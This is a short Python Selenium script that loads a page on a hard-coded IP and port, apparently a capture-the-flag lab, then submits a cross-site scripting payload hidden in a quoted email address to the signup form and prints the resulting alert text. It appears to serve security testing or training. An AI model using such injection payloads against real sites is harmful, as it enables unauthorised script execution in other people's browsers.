from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.alert import Alert
import time


host, port = "94.237.61.187", 42238

url = f"http://{host}:{port}"


#run browser
driver = webdriver.Firefox()
driver.get(url)

#wait for loading page
time.sleep(2)

#find email input
email_input = driver.find_element(By.ID, "email")
email_input.send_keys('"<script>alert(\'test\')</script>"a.b')

#send form
click_button = driver.find_element(By.ID,"signup")
click_button.click()

time.sleep(3)

#grab alert
alert = WebDriverWait(driver,10).until(EC.alert_is_present())

alert_text = alert.text
print(alert_text)

alert.accept()
driver.quit()
